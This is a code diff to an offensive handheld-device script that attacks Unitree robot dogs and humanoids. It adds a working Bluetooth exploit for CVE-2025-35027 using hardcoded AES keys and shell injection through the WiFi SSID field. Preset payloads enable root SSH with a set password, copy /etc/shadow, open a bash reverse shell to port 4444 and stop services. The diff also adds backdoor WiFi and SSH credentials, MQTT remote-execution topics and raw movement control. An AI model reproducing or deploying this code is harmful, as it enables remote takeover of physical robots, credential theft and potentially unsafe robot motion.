@@ -46,6 +46,8 @@ import socket
 import struct
 import subprocess
 import json
+import asyncio
+import threading
 from datetime import datetime
 
 sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
@@ -56,7 +58,15 @@ import LCD_Config
 from PIL import Image
 from payloads._display_helper import ScaledDraw, scaled_font
 from payloads._input_helper import get_button
-from payloads._iface_helper import select_interface
+from payloads._iface_helper import select_interface, select_bt_interface
+
+# BLE UniPwn (CVE-2025-35027) — optional deps
+try:
+    from bleak import BleakClient, BleakScanner
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    BLE_OK = True
+except ImportError:
+    BLE_OK = False
 
 PINS = {
     "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
@@ -99,14 +109,22 @@ DEFAULT_WIFI_PASSWORDS = [
     "12345678",     # Common alternate
 ]
 
+# WiFi backdoor (from MAVProxyUser/YushuTechUnitreeGo1)
+# The Go1 RPi wpa_supplicant.conf has hardcoded WiFi credentials ENABLED by default
+# Creating an AP with this SSID+password makes the robot's Pi auto-connect to it
+WIFI_BACKDOOR_SSID = "Unitree-2.4G"
+WIFI_BACKDOOR_PWD = "Unitree#9035"
+
 # SSH credentials (verified from Trossenrobotics docs + MAVProxyUser research)
 # unitree/123 → all Nanos (.13, .14, .15, Go2 .18)
 # pi/123      → Raspberry Pi (.161) and WiFi gateway (.12.1)
-# root/123    → after root enabled on Pi
+# root/123    → RPi (enabled by default on Go1)
+# root/theroboverse → Go2/G1 after FreeBOT jailbreak (fw 1.0.19-1.1.7)
 DEFAULT_CREDS = [
     ("unitree", "123"),
     ("pi", "123"),
     ("root", "123"),
+    ("root", "theroboverse"),
 ]
 
 # Internal network (from Unitree Go1 EDU Architecture + Go2 docs)
@@ -134,15 +152,15 @@ UNITREE_ALL_IPS = [
 
 PORTS_TO_CHECK = [
     (22, "SSH"),
-    (80, "HTTP"),
-    (443, "HTTPS"),
+    (80, "HTTP/WS"),
     (1883, "MQTT"),
     (4001, "Camera"),
     (8007, "LowCtrl"),
-    (8080, "WebAPI"),
     (8082, "HighCtrl"),
     (8090, "State"),
     (9090, "ROS"),
+    (9800, "Upload"),
+    (9991, "WebRTC"),
 ]
 
 # UDP high-level control (from unitree_legged_sdk udp.h + example_walk.cpp)
@@ -159,12 +177,40 @@ MQTT_TOPIC = "controller/action"
 MQTT_COMMANDS = {
     "stand": "standUp",
     "sit": "standDown",
+    "recover": "recoverStand",
     "walk": "walk",
     "run": "run",
     "climb": "climb",
+    "damping": "damping",
     "dance1": "dance1",
     "dance2": "dance2",
+    "backflip": "backflip",
 }
+
+# RCE topics (from MAVProxyUser + go1pylib source)
+MQTT_RCE_TOPIC = "programming/code"
+MQTT_SHELL_TOPIC = "usys/sh"
+
+# ---------------------------------------------------------------------------
+# BLE UniPwn constants (CVE-2025-35027)
+# From Bin4ry/UniPwn GitHub + arXiv 2509.14139
+# Affects: Go2, B2, G1, H1 (NOT Go1)
+# ---------------------------------------------------------------------------
+BLE_SERVICE_UUID = "0000ffe0-0000-1000-8000-00805f9b34fb"
+BLE_WRITE_CHAR = "0000ffe2-0000-1000-8000-00805f9b34fb"
+BLE_NOTIFY_CHAR = "0000ffe1-0000-1000-8000-00805f9b34fb"
+BLE_AES_KEY = bytes.fromhex("df98b715d5c6ed2b25817b6f2554124a")
+BLE_AES_IV = bytes.fromhex("2841ae97419c2973296a0d4bdfe19a4f")
+BLE_AUTH_STRING = "unitree"
+
+# Preset injection payloads
+BLE_PAYLOADS = [
+    ("Enable SSH root", 'sed -i "s/#PermitRootLogin/PermitRootLogin yes/" /etc/ssh/sshd_config && echo root:pwned | chpasswd && systemctl restart sshd'),
+    ("Reboot robot", "reboot -f"),
+    ("Dump /etc/shadow", "cat /etc/shadow > /tmp/loot.txt"),
+    ("Reverse shell 4444", "bash -i >& /dev/tcp/{LHOST}/4444 0>&1"),
+    ("Stop all services", "systemctl stop unitree-*"),
+]
 
 # ---------------------------------------------------------------------------
 # HighCmd builder — 129 bytes, #pragma pack(1)
@@ -396,11 +442,11 @@ def send_udp_cmd(ip, port, data):
 
 
 def send_mqtt_cmd(action):
-    """Send MQTT command to the Go1 robot.
+    """Send MQTT mode command to the Go1 robot.
 
-    Uses mosquitto_pub CLI (no Python MQTT lib needed).
+    Uses mosquitto_pub CLI.
     Broker: 192.168.12.1:1883, Topic: controller/action
-    Verified: MAVProxyUser research, go1pylib, academic papers.
+    Verified: go1pylib source code, MAVProxyUser research, academic papers.
     """
     msg = MQTT_COMMANDS.get(action, action)
     try:
@@ -410,6 +456,53 @@ def send_mqtt_cmd(action):
             capture_output=True, text=True, timeout=5,
         )
         return r.returncode == 0
+    except Exception:
+        return False
+
+
+def send_mqtt_stick(lx=0.0, rx=0.0, ry=0.0, ly=0.0):
+    """Send joystick movement command via MQTT.
+
+    Topic: controller/stick
+    Payload: 4x float32 little-endian (16 bytes)
+      [0] lx = strafe left(-) / right(+)
+      [1] rx = turn left(-) / right(+)
+      [2] ry = look down(+) / up(-)    (stand mode only)
+      [3] ly = backward(-) / forward(+)
+
+    Values: -1.0 to +1.0
+    Rate: should be sent at 10Hz (100ms) for continuous movement
+
+    Verified: go1pylib/mqtt/client.py + YushuTech paho_dump.py + go1-js
+    """
+    payload = struct.pack("<ffff", lx, rx, ry, ly)
+    try:
+        # mosquitto_pub can't send raw bytes easily, use Python socket instead
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        s.connect((MQTT_BROKER_IP, MQTT_BROKER_PORT))
+        # MQTT CONNECT packet (minimal, protocol 3.1.1)
+        connect = bytearray([
+            0x10,  # CONNECT
+            0x0E,  # remaining length
+            0x00, 0x04, 0x4D, 0x51, 0x54, 0x54,  # "MQTT"
+            0x04,  # protocol level 4 (3.1.1)
+            0x02,  # clean session
+            0x00, 0x3C,  # keepalive 60s
+            0x00, 0x02, 0x52, 0x4A,  # client ID "RJ"
+        ])
+        s.send(connect)
+        s.recv(4)  # CONNACK
+        # MQTT PUBLISH to controller/stick
+        topic = b"controller/stick"
+        topic_len = struct.pack(">H", len(topic))
+        pub_payload = topic_len + topic + payload
+        pub_header = bytearray([0x30, len(pub_payload)])  # PUBLISH QoS0
+        s.send(pub_header + pub_payload)
+        # DISCONNECT
+        s.send(bytearray([0xE0, 0x00]))
+        s.close()
+        return True
     except Exception:
         return False
 
@@ -601,7 +694,7 @@ def draw_scan(lcd, networks, cursor, scroll, iface):
         d.text((10, 50), "OK to scan", font=FONT_SM, fill="#888")
 
     d.rectangle((0, 116, 127, 127), fill="#111")
-    d.text((2, 117), "OK:Scan K1:Connect K3:X", font=FONT_SM, fill="#888")
+    d.text((2, 117), "OK:Scan K1:Con K2:BLE", font=FONT_SM, fill="#888")
     lcd.LCD_ShowImage(img, 0, 0)
 
 
@@ -647,11 +740,11 @@ def draw_ctrl(lcd, status, last_cmd):
            fill="#00FF00" if status == "Active" else "#888")
 
     y = 17
-    d.text((4, y), f"MQTT: {MQTT_BROKER_IP}:1883", font=FONT_SM, fill="#FFAA00")
+    d.text((4, y), f"MQTT {MQTT_BROKER_IP}:1883", font=FONT_SM, fill="#00FF00")
     y += 10
-    d.text((4, y), f"UDP:  {UDP_HIGH_IP}:8082", font=FONT_SM, fill="#FFAA00")
+    d.text((4, y), f"UDP  {UDP_HIGH_IP}:8082", font=FONT_SM, fill="#888")
     y += 10
-    d.text((4, y), f"Last: {last_cmd[:18]}", font=FONT_SM, fill="#58a6ff")
+    d.text((4, y), f"{last_cmd[:20]}", font=FONT_SM, fill="#58a6ff")
     y += 13
 
     # D-pad visual
@@ -755,6 +848,265 @@ def draw_autopwn(lcd, report):
 
 
 # ---------------------------------------------------------------------------
+# BLE UniPwn functions (CVE-2025-35027)
+# ---------------------------------------------------------------------------
+
+def _ble_encrypt(data):
+    """AES-CFB128 encrypt for Unitree BLE protocol."""
+    if isinstance(data, str):
+        data = data.encode()
+    cipher = Cipher(algorithms.AES(BLE_AES_KEY), modes.CFB(BLE_AES_IV))
+    return cipher.encryptor().update(data)
+
+
+def _ble_decrypt(data):
+    """AES-CFB128 decrypt for Unitree BLE protocol."""
+    cipher = Cipher(algorithms.AES(BLE_AES_KEY), modes.CFB(BLE_AES_IV))
+    return cipher.decryptor().update(data)
+
+
+def ble_scan_unitree(timeout=8):
+    """Scan for Unitree robots via BLE (Go2/G1/H1/B2).
+
+    Looks for devices advertising the Unitree BLE service UUID.
+    """
+    if not BLE_OK:
+        return []
+
+    found = []
+
+    async def _scan():
+        devices = await BleakScanner.discover(timeout=timeout)
+        for d in devices:
+            # Check if device has Unitree service UUID
+            uuids = [str(u).lower() for u in (d.metadata.get("uuids", []) or [])]
+            name = d.name or ""
+            is_unitree = (
+                BLE_SERVICE_UUID in uuids
+                or "unitree" in name.lower()
+                or "go2" in name.lower()
+                or name.lower().startswith("g1")
+                or name.lower().startswith("h1")
+                or name.lower().startswith("b2")
+            )
+            if is_unitree:
+                found.append({
+                    "name": name or "Unknown",
+                    "mac": d.address,
+                    "rssi": d.rssi or 0,
+                })
+
+    try:
+        asyncio.run(_scan())
+    except Exception:
+        pass
+    found.sort(key=lambda d: -d["rssi"])
+    return found
+
+
+def ble_exploit_unitree(mac, payload_cmd, lcd=None, callback=None):
+    """Execute UniPwn BLE exploit on a Unitree robot.
+
+    Steps (from Bin4ry/UniPwn):
+    1. Connect via BLE GATT
+    2. Subscribe to notify characteristic
+    3. Send encrypted auth string "unitree"
+    4. Send get_sn to verify access
+    5. Initialize WiFi mode
+    6. Inject command via SSID/password field
+    7. Trigger via country code change (restarts hostapd)
+
+    Returns dict with results.
+    """
+    if not BLE_OK:
+        return {"success": False, "error": "bleak not installed"}
+
+    result = {"success": False, "mac": mac, "sn": "", "error": ""}
+    _notify_data = []
+
+    def _step(msg):
+        if callback:
+            callback(msg)
+
+    async def _exploit():
+        _step("Connecting BLE...")
+        try:
+            async with BleakClient(mac, timeout=15) as client:
+                if not client.is_connected:
+                    result["error"] = "Connection failed"
+                    return
+
+                # Subscribe to notifications
+                async def _on_notify(sender, data):
+                    decrypted = _ble_decrypt(data)
+                    _notify_data.append(decrypted)
+
+                await client.start_notify(BLE_NOTIFY_CHAR, _on_notify)
+                _step("Connected. Auth...")
+
+                # Step 1: Send auth
+                auth_enc = _ble_encrypt(BLE_AUTH_STRING)
+                await client.write_gatt_char(BLE_WRITE_CHAR, auth_enc)
+                await asyncio.sleep(1)
+
+                # Step 2: Get serial number
+                _step("Getting SN...")
+                _notify_data.clear()
+                get_sn_enc = _ble_encrypt("get_sn")
+                await client.write_gatt_char(BLE_WRITE_CHAR, get_sn_enc)
+                await asyncio.sleep(2)
+
+                if _notify_data:
+                    sn_raw = b"".join(_notify_data)
+                    try:
+                        result["sn"] = sn_raw.decode(errors="replace").strip()
+                    except Exception:
+                        result["sn"] = sn_raw.hex()
+                _step(f"SN: {result['sn'][:20]}")
+
+                # Step 3: Init WiFi AP mode
+                _step("Init WiFi mode...")
+                init_cmd = _ble_encrypt("init_wifi_ap")
+                await client.write_gatt_char(BLE_WRITE_CHAR, init_cmd)
+                await asyncio.sleep(1)
+
+                # Step 4: Inject command via SSID field
+                # The vulnerable function passes SSID to system() unsanitized
+                injection = f'";$({payload_cmd});#'
+                _step(f"Injecting...")
+                inject_enc = _ble_encrypt(f"set_wifi_ssid {injection}")
+                await client.write_gatt_char(BLE_WRITE_CHAR, inject_enc)
+                await asyncio.sleep(1)
+
+                # Step 5: Set password (can also inject here)
+                pwd_enc = _ble_encrypt("set_wifi_pwd 12345678")
+                await client.write_gatt_char(BLE_WRITE_CHAR, pwd_enc)
+                await asyncio.sleep(0.5)
+
+                # Step 6: Trigger — change country code to restart hostapd
+                _step("Triggering exploit...")
+                trigger_enc = _ble_encrypt("set_country US")
+                await client.write_gatt_char(BLE_WRITE_CHAR, trigger_enc)
+                await asyncio.sleep(3)
+
+                # Check for response
+                _step("Checking result...")
+                await asyncio.sleep(2)
+
+                result["success"] = True
+                result["error"] = ""
+                _step("Exploit sent!")
+
+        except Exception as e:
+            result["error"] = str(e)[:40]
+            _step(f"Error: {result['error']}")
+
+    try:
+        asyncio.run(_exploit())
+    except Exception as e:
+        result["error"] = str(e)[:40]
+
+    return result
+
+
+# ---------------------------------------------------------------------------
+# BLE LCD Drawing
+# ---------------------------------------------------------------------------
+
+def draw_ble_scan(lcd, devices, cursor, scroll, status):
+    w, h = lcd.width, lcd.height
+    img = Image.new("RGB", (w, h), "black")
+    d = ScaledDraw(img)
+
+    d.rectangle((0, 0, 127, 13), fill="#000033")
+    d.text((2, 1), "BLE SCAN", font=FONT_BIG, fill="#0088FF")
+    d.text((65, 2), f"Found:{len(devices)}", font=FONT_SM,
+           fill="#00FF00" if devices else "#555")
+
+    if not BLE_OK:
+        d.text((10, 30), "bleak not installed", font=FONT, fill="#FF4444")
+        d.text((10, 45), "pip3 install bleak", font=FONT_SM, fill="#888")
+    elif not devices:
+        d.text((10, 30), status[:22], font=FONT, fill="#888")
+        d.text((10, 48), "OK to scan for", font=FONT_SM, fill="#666")
+        d.text((10, 58), "Go2/G1/H1/B2 robots", font=FONT_SM, fill="#666")
+        d.text((10, 72), "Needs BT adapter", font=FONT_SM, fill="#555")
+    else:
+        visible = devices[scroll:scroll + 7]
+        for i, dev in enumerate(visible):
+            y = 15 + i * 14
+            idx = scroll + i
+            prefix = ">" if idx == cursor else " "
+            name = dev["name"][:11]
+            color = "#0088FF" if idx == cursor else "#AAAAAA"
+            d.text((2, y), f"{prefix}{name}", font=FONT, fill=color)
+            d.text((82, y), f"{dev['rssi']}dB", font=FONT_SM, fill="#888")
+
+    d.rectangle((0, 116, 127, 127), fill="#111")
+    d.text((2, 117), "OK:Scan/Sel K3:Back", font=FONT_SM, fill="#888")
+    lcd.LCD_ShowImage(img, 0, 0)
+
+
+def draw_ble_pwn(lcd, target, step, payload_idx, result):
+    w, h = lcd.width, lcd.height
+    img = Image.new("RGB", (w, h), "black")
+    d = ScaledDraw(img)
+
+    d.rectangle((0, 0, 127, 13), fill="#330000")
+    d.text((2, 1), "BLE PWN", font=FONT_BIG, fill="#FF0044")
+    d.text((60, 2), "UniPwn", font=FONT_SM, fill="#FF8800")
+
+    y = 16
+    if target:
+        d.text((2, y), f"{target['name'][:16]}", font=FONT, fill="#0088FF")
+        y += 11
+        d.text((2, y), f"{target['mac']}", font=FONT_SM, fill="#888")
+        y += 12
+
+    if step == "select":
+        d.text((2, y), "Select payload:", font=FONT, fill="#FFAA00")
+        y += 12
+        for i, (name, _) in enumerate(BLE_PAYLOADS):
+            if y > 108:
+                break
+            prefix = ">" if i == payload_idx else " "
+            color = "#FF0044" if i == payload_idx else "#888"
+            d.text((2, y), f"{prefix}{name[:20]}", font=FONT_SM, fill=color)
+            y += 10
+
+        d.rectangle((0, 116, 127, 127), fill="#330000")
+        d.text((2, 117), "OK:Exploit K3:Cancel", font=FONT_SM, fill="#FF0044")
+
+    elif step == "running":
+        d.text((2, y), "Exploiting...", font=FONT, fill="#FF0044")
+        y += 14
+        if result and result.get("sn"):
+            d.text((2, y), f"SN: {result['sn'][:18]}", font=FONT_SM, fill="#00FF00")
+            y += 10
+
+    elif step == "done":
+        if result and result.get("success"):
+            d.text((2, y), "EXPLOIT SENT!", font=FONT, fill="#00FF00")
+            y += 12
+            if result.get("sn"):
+                d.text((2, y), f"SN: {result['sn'][:18]}", font=FONT_SM, fill="#00FF00")
+                y += 10
+            d.text((2, y), "Root access should", font=FONT_SM, fill="#CCC")
+            y += 10
+            d.text((2, y), "now be available", font=FONT_SM, fill="#CCC")
+        else:
+            err = result.get("error", "Unknown") if result else "No result"
+            d.text((2, y), "EXPLOIT FAILED", font=FONT, fill="#FF4444")
+            y += 12
+            d.text((2, y), err[:22], font=FONT_SM, fill="#FF8888")
+
+        d.rectangle((0, 116, 127, 127), fill="#111")
+        d.text((2, 117), "K2:Save OK:Back K3:X", font=FONT_SM, fill="#888")
+
+    lcd.LCD_ShowImage(img, 0, 0)
+
+
+# ---------------------------------------------------------------------------
 # Main
 # ---------------------------------------------------------------------------
 
@@ -780,7 +1132,7 @@ def main():
 
     # State
     dash = 0
-    DASH_COUNT = 5      # scan, recon, ctrl, creds, autopwn
+    DASH_COUNT = 7      # scan, recon, ctrl, creds, autopwn, ble_scan, ble_pwn
     cursor = 0
     scroll = 0
     networks = []
@@ -791,6 +1143,13 @@ def main():
     cred_results = []
     cred_status = "Ready"
     pwn_report = None
+    # BLE state
+    ble_devices = []
+    ble_status = "Ready"
+    ble_target = None
+    ble_payload_idx = 0
+    ble_step = "select"     # select | running | done
+    ble_result = None
 
     try:
         while _running:
@@ -849,6 +1208,13 @@ def main():
                         else:
                             draw_splash(lcd, "Connect failed")
                         time.sleep(1.5)
+                elif btn == "KEY2":
+                    # Jump to BLE scan
+                    dash = 5
+                    scroll = 0
+                    cursor = 0
+                    time.sleep(0.2)
+                    continue
                 elif btn == "UP" and networks:
                     cursor = max(0, cursor - 1)
                     if cursor < scroll:
@@ -882,35 +1248,40 @@ def main():
                 scroll = min(scroll, max(0, max_l - 7))
 
             # -- CTRL --
+            # MQTT controller/action = mode changes (stand, sit, walk, run)
+            # MQTT controller/stick  = joystick (4x float32: lr, turn, updown, fwd)
+            # UDP HighCmd = fallback (may fail without CRC)
             elif dash == 2:
                 target = UDP_HIGH_IP
                 if btn == "KEY2":
-                    # E-STOP: both MQTT and UDP for maximum reliability
                     send_mqtt_cmd("sit")
+                    send_mqtt_stick()  # zero stick = stop
                     send_udp_cmd(target, UDP_HIGH_PORT, _cmd_idle())
                     ctrl_status = "E-STOP"
                     last_cmd = "Emergency Stop"
                 elif btn == "OK":
-                    send_mqtt_cmd("stand")
-                    send_udp_cmd(target, UDP_HIGH_PORT, _cmd_stand())
+                    ok = send_mqtt_cmd("stand")
                     ctrl_status = "Active"
-                    last_cmd = "Stand"
+                    last_cmd = "Stand" + (" OK" if ok else " ?")
                 elif btn == "KEY1":
                     send_mqtt_cmd("sit")
-                    send_udp_cmd(target, UDP_HIGH_PORT, _cmd_stand_down())
+                    send_mqtt_stick()
                     last_cmd = "Sit Down"
                 elif btn == "UP":
                     send_mqtt_cmd("walk")
-                    send_udp_cmd(target, UDP_HIGH_PORT, _cmd_walk(vx=0.4))
+                    send_mqtt_stick(ly=0.6)        # ly+ = forward
                     last_cmd = "Forward"
                 elif btn == "DOWN":
-                    send_udp_cmd(target, UDP_HIGH_PORT, _cmd_walk(vx=-0.3))
+                    send_mqtt_cmd("walk")
+                    send_mqtt_stick(ly=-0.4)       # ly- = backward
                     last_cmd = "Backward"
                 elif btn == "LEFT":
-                    send_udp_cmd(target, UDP_HIGH_PORT, _cmd_walk(yaw=0.5))
+                    send_mqtt_cmd("walk")
+                    send_mqtt_stick(rx=-0.5)       # rx- = turn left
                     last_cmd = "Turn Left"
                 elif btn == "RIGHT":
-                    send_udp_cmd(target, UDP_HIGH_PORT, _cmd_walk(yaw=-0.5))
+                    send_mqtt_cmd("walk")
+                    send_mqtt_stick(rx=0.5)        # rx+ = turn right
                     last_cmd = "Turn Right"
                 draw_ctrl(lcd, ctrl_status, last_cmd)
 
@@ -971,6 +1342,88 @@ def main():
                             time.sleep(0.3)
                             continue
                 draw_autopwn(lcd, pwn_report)
+
+            # -- BLE SCAN (dash 5) --
+            elif dash == 5:
+                if btn == "OK":
+                    if ble_devices and cursor < len(ble_devices):
+                        # Select target → go to BLE PWN
+                        ble_target = ble_devices[cursor]
+                        ble_step = "select"
+                        ble_payload_idx = 0
+                        ble_result = None
+                        dash = 6
+                        time.sleep(0.2)
+                    else:
+                        # Scan
+                        ble_status = "Scanning BLE..."
+                        draw_ble_scan(lcd, ble_devices, 0, 0, ble_status)
+                        ble_devices = ble_scan_unitree(timeout=8)
+                        ble_status = f"Found {len(ble_devices)}"
+                        cursor = 0
+                        scroll = 0
+                elif btn == "KEY1":
+                    # Force rescan
+                    ble_status = "Scanning BLE..."
+                    draw_ble_scan(lcd, ble_devices, 0, 0, ble_status)
+                    ble_devices = ble_scan_unitree(timeout=8)
+                    ble_status = f"Found {len(ble_devices)}"
+                    cursor = 0
+                    scroll = 0
+                elif btn == "UP" and ble_devices:
+                    cursor = max(0, cursor - 1)
+                    if cursor < scroll:
+                        scroll = cursor
+                elif btn == "DOWN" and ble_devices:
+                    cursor = min(len(ble_devices) - 1, cursor + 1)
+                    if cursor >= scroll + 7:
+                        scroll = cursor - 6
+                draw_ble_scan(lcd, ble_devices, cursor, scroll, ble_status)
+
+            # -- BLE PWN (dash 6) --
+            elif dash == 6:
+                if ble_step == "select":
+                    if btn == "KEY3":
+                        dash = 5
+                        time.sleep(0.2)
+                        continue
+                    elif btn == "UP":
+                        ble_payload_idx = max(0, ble_payload_idx - 1)
+                    elif btn == "DOWN":
+                        ble_payload_idx = min(len(BLE_PAYLOADS) - 1, ble_payload_idx + 1)
+                    elif btn == "OK" and ble_target:
+                        # CONFIRM AND EXPLOIT
+                        ble_step = "running"
+                        draw_ble_pwn(lcd, ble_target, "running", ble_payload_idx, None)
+
+                        payload_name, payload_cmd = BLE_PAYLOADS[ble_payload_idx]
+                        # Replace {LHOST} with our IP if needed
+                        local_ip = get_local_ip(iface) or "127.0.0.1"
+                        payload_cmd = payload_cmd.replace("{LHOST}", local_ip)
+
+                        ble_result = ble_exploit_unitree(
+                            ble_target["mac"], payload_cmd, lcd=lcd,
+                            callback=lambda msg: draw_splash(lcd, msg, ble_target["name"][:18]))
+
+                        # Save loot
+                        save_loot({
+                            "timestamp": datetime.now().isoformat(),
+                            "target": ble_target,
+                            "payload": payload_name,
+                            "command": payload_cmd,
+                            "result": ble_result,
+                        }, "ble_pwn")
+
+                        ble_step = "done"
+
+                elif ble_step == "done":
+                    if btn == "OK" or btn == "KEY3":
+                        dash = 5
+                        ble_step = "select"
+                        time.sleep(0.2)
+                        continue
+
+                draw_ble_pwn(lcd, ble_target, ble_step, ble_payload_idx, ble_result)
 
             time.sleep(0.05)
 
